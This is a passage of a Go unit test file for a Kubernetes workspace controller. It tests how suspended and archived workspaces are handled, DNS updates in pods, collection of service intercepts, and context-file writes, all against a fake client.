		Status: corev1.PodStatus{
			Phase: corev1.PodRunning,
		},
	}

	k8sClient := testutil.NewFakeClient(scheme, workspace, pod).
		WithStatusSubresource(&workspacev1.Workspace{}).
		Build()

	logger := zaptest.NewLogger(t)
	reconciler := &WorkspaceReconciler{
		Client:    k8sClient,
		Scheme:    scheme,
		Logger:    logger,
		Config:    &rest.Config{},
		Clientset: kubernetes.NewForConfigOrDie(&rest.Config{}),
	}

	ctx := context.Background()

	tests := []struct {
		name        string
		workspace   *workspacev1.Workspace
		expectError bool
		expectPhase string
	}{
		{
			name:        "handle suspended workspace",
			workspace:   workspace,
			expectError: false,
			expectPhase: "Stopped",
		},
		{
			name: "handle archived workspace",
			workspace: &workspacev1.Workspace{
				ObjectMeta: metav1.ObjectMeta{
					Name:       "test-workspace-archived",
					Namespace:  "test-namespace",
					Finalizers: []string{workspaceFinalizer},
				},
				Spec: workspacev1.WorkspaceSpec{
					Owner:       "test@example.com",
					Status:      "archived",
					DisplayName: "Test Archived Workspace",
				},
				Status: workspacev1.WorkspaceStatus{
					Phase: "Running",
				},
			},
			expectError: false,
			expectPhase: "Stopped",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := reconciler.handleSuspendedWorkspace(ctx, tt.workspace, logger)

			if tt.expectError {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
				assert.False(t, result.Requeue)

				// Verify workspace status is updated
				assert.Equal(t, tt.expectPhase, tt.workspace.Status.Phase)
				assert.Contains(t, tt.workspace.Status.Message, "stopped")
			}
		})
	}
}

func TestUpdateDNSConfigInRunningPod(t *testing.T) {
	scheme := testutil.NewTestScheme()

	workspace := &workspacev1.Workspace{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-workspace",
			Namespace: "test-namespace",
		},
		Spec: workspacev1.WorkspaceSpec{
			Owner: "test@example.com",
		},
		Status: workspacev1.WorkspaceStatus{
			PodName: "workspace-test-workspace",
		},
	}

	pod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "workspace-test-workspace",
			Namespace: "test-namespace",
		},
		Spec: corev1.PodSpec{
			Containers: []corev1.Container{
				{
					Name:  "workspace",
					Image: "test-image",
				},
			},
		},
		Status: corev1.PodStatus{
			Phase: corev1.PodRunning,
			PodIP: "192.168.1.100",
		},
	}

	k8sClient := testutil.NewFakeClient(scheme, workspace, pod).
		WithStatusSubresource(&workspacev1.Workspace{}).
		Build()

	logger := zaptest.NewLogger(t)
	reconciler := &WorkspaceReconciler{
		Client:    k8sClient,
		Scheme:    scheme,
		Logger:    logger,
		Config:    &rest.Config{},
		Clientset: kubernetes.NewForConfigOrDie(&rest.Config{}),
	}

	ctx := context.Background()

	tests := []struct {
		name        string
		workspace   *workspacev1.Workspace
		expectError bool
		errorMsg    string
		setupFunc   func()
	}{
		{
			name:        "valid DNS update",
			workspace:   workspace,
			expectError: true, // Will fail due to fake clientset limitations
			errorMsg:    "",   // Connection error varies by environment
			setupFunc:   nil,
		},
		{
			name: "workspace without pod name",
			workspace: &workspacev1.Workspace{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "test-workspace-no-pod",
					Namespace: "test-namespace",
				},
				Spec: workspacev1.WorkspaceSpec{
					Owner: "test@example.com",
				},
				Status: workspacev1.WorkspaceStatus{
					PodName: "", // No pod name
				},
			},
			expectError: true,
			errorMsg:    "failed to get pod",
			setupFunc:   nil,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Add test workspace to client if different from default
			if tt.workspace.Name != workspace.Name {
				k8sClient := testutil.NewFakeClient(scheme, tt.workspace, pod).
					WithStatusSubresource(&workspacev1.Workspace{}).
					Build()
				reconciler.Client = k8sClient
			}

			// Call setup function if provided
			if tt.setupFunc != nil {
				tt.setupFunc()
			}

			err := reconciler.updateDNSConfigInRunningPod(ctx, tt.workspace, logger)

			if tt.expectError {
				assert.Error(t, err)
				if tt.errorMsg != "" {
					assert.Contains(t, err.Error(), tt.errorMsg)
				}
			} else {
				// DNS update might fail with fake clientset due to connection issues,
				// but we can verify it passed validation
				if err != nil && !strings.Contains(err.Error(), "unable to upgrade connection") && !strings.Contains(err.Error(), "connection refused") {
					assert.NoError(t, err)
				}
			}
		})
	}
}

func TestCollectActiveIntercepts(t *testing.T) {
	scheme := testutil.NewTestScheme()

	workspace := &workspacev1.Workspace{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-workspace",
			Namespace: "workspace-ns",
		},
		Spec: workspacev1.WorkspaceSpec{
			EnvironmentConnection: &workspacev1.EnvironmentConnectionSpec{
				EnvironmentRef: corev1.ObjectReference{
					Name: "test-env",
				},
			},
		},
	}

	env := &environmentv1.Environment{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-env",
			Namespace: "workspace-ns",
		},
		Spec: environmentv1.EnvironmentSpec{
			Activated:       true,
			TargetNamespace: "env-target-ns",
		},
	}

	// Create some ServiceIntercepts with different statuses
	intercept1 := &interceptsv1.ServiceIntercept{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "web-test-workspace",
			Namespace: "env-target-ns",
			Labels: map[string]string{
				"workspaces.kloudlite.io/workspace-name":      "test-workspace",
				"workspaces.kloudlite.io/workspace-namespace": "workspace-ns",
			},
		},
		Spec: interceptsv1.ServiceInterceptSpec{
			ServiceRef: corev1.ObjectReference{Name: "web"},
		},
		Status: interceptsv1.ServiceInterceptStatus{
			Phase:   "Active",
			Message: "Intercept is active",
		},
	}

	intercept2 := &interceptsv1.ServiceIntercept{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "api-test-workspace",
			Namespace: "env-target-ns",
			Labels: map[string]string{
				"workspaces.kloudlite.io/workspace-name":      "test-workspace",
				"workspaces.kloudlite.io/workspace-namespace": "workspace-ns",
			},
		},
		Spec: interceptsv1.ServiceInterceptSpec{
			ServiceRef: corev1.ObjectReference{Name: "api"},
		},
		Status: interceptsv1.ServiceInterceptStatus{
			Phase:   "Pending",
			Message: "Waiting for service",
		},
	}

	k8sClient := testutil.NewFakeClient(scheme, workspace, env, intercept1, intercept2).Build()

	logger := zaptest.NewLogger(t)
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	activeIntercepts := reconciler.collectActiveIntercepts(context.Background(), workspace, logger)

	// Should collect both intercepts
	assert.Len(t, activeIntercepts, 2)

	// Verify the intercept statuses
	interceptMap := make(map[string]workspacev1.InterceptStatus)
	for _, is := range activeIntercepts {
		interceptMap[is.ServiceName] = is
	}

	assert.Contains(t, interceptMap, "web")
	assert.Contains(t, interceptMap, "api")
	assert.Equal(t, "Active", interceptMap["web"].Phase)
	assert.Equal(t, "Pending", interceptMap["api"].Phase)
}

func TestCollectActiveIntercepts_NoEnvironmentConnection(t *testing.T) {
	scheme := testutil.NewTestScheme()

	workspace := &workspacev1.Workspace{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-workspace",
			Namespace: "workspace-ns",
		},
		Spec: workspacev1.WorkspaceSpec{
			EnvironmentConnection: nil, // No environment connection
		},
	}

	k8sClient := testutil.NewFakeClient(scheme, workspace).Build()

	logger := zaptest.NewLogger(t)
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	activeIntercepts := reconciler.collectActiveIntercepts(context.Background(), workspace, logger)

	// Should return empty slice
	assert.Empty(t, activeIntercepts)
}

func TestCollectActiveIntercepts_EnvironmentNotFound(t *testing.T) {
	scheme := testutil.NewTestScheme()

	workspace := &workspacev1.Workspace{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-workspace",
			Namespace: "workspace-ns",
		},
		Spec: workspacev1.WorkspaceSpec{
			EnvironmentConnection: &workspacev1.EnvironmentConnectionSpec{
				EnvironmentRef: corev1.ObjectReference{
					Name: "nonexistent-env",
				},
			},
		},
	}

	k8sClient := testutil.NewFakeClient(scheme, workspace).Build()

	logger := zaptest.NewLogger(t)
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	activeIntercepts := reconciler.collectActiveIntercepts(context.Background(), workspace, logger)

	// Should return empty slice when environment not found
	assert.Empty(t, activeIntercepts)
}

func TestUpdateKloudliteContextFile(t *testing.T) {
	scheme := testutil.NewTestScheme()

	workspace := &workspacev1.Workspace{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-workspace",
			Namespace: "workspace-ns",
		},
		Spec: workspacev1.WorkspaceSpec{
			EnvironmentConnection: &workspacev1.EnvironmentConnectionSpec{
				EnvironmentRef: corev1.ObjectReference{
					Name: "test-env",
				},
			},
		},
		Status: workspacev1.WorkspaceStatus{
			ActiveIntercepts: []workspacev1.InterceptStatus{
				{ServiceName: "web", Phase: "Active"},
				{ServiceName: "api", Phase: "Active"},
			},
		},
	}

	env := &environmentv1.Environment{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-env",
			Namespace: "workspace-ns",
		},
		Spec: environmentv1.EnvironmentSpec{
			Activated:       true,
			TargetNamespace: "env-target-ns",
		},
	}

	// Create a running pod
	pod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "workspace-test-workspace",
			Namespace: "workspace-ns",
		},
		Spec: corev1.PodSpec{
			Containers: []corev1.Container{
				{Name: "workspace"},
			},
		},
		Status: corev1.PodStatus{
			Phase: corev1.PodRunning,
		},
	}

	k8sClient := testutil.NewFakeClient(scheme, workspace, env, pod).Build()

	logger := zaptest.NewLogger(t)
	reconciler := &WorkspaceReconciler{
		Client:    k8sClient,
		Scheme:    scheme,
		Logger:    logger,
		Config:    &rest.Config{},
		Clientset: kubernetes.NewForConfigOrDie(&rest.Config{}),
	}

	// Note: This will fail trying to exec into pod since it's a fake client
	// But it will still exercise the code paths for building the context data
	err := reconciler.updateKloudliteContextFile(context.Background(), workspace, logger)

	// We expect an error because fake client can't exec into pods
	// But the important part is that it tried to execute
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "write context file")
}

func TestUpdateKloudliteContextFile_PodNotRunning(t *testing.T) {
	scheme := testutil.NewTestScheme()

	workspace := &workspacev1.Workspace{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-workspace",
			Namespace: "workspace-ns",
		},
	}

	// Create a pending pod (not running)
	pod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "workspace-test-workspace",
			Namespace: "workspace-ns",
		},
		Spec: corev1.PodSpec{
			Containers: []corev1.Container{
				{Name: "workspace"},
			},
		},
		Status: corev1.PodStatus{
			Phase: corev1.PodPending,
		},
	}

	k8sClient := testutil.NewFakeClient(scheme, workspace, pod).Build()

	logger := zaptest.NewLogger(t)
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	err := reconciler.updateKloudliteContextFile(context.Background(), workspace, logger)

	// Should return nil when pod is not running (skipped)
	assert.NoError(t, err)
}

func TestUpdateKloudliteContextFile_PodNotFound(t *testing.T) {
	scheme := testutil.NewTestScheme()

	workspace := &workspacev1.Workspace{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-workspace",
			Namespace: "workspace-ns",
		},
	}

	k8sClient := testutil.NewFakeClient(scheme, workspace).Build()

	logger := zaptest.NewLogger(t)
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	err := reconciler.updateKloudliteContextFile(context.Background(), workspace, logger)

	// Should return error when pod doesn't exist
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "failed to get pod")
}
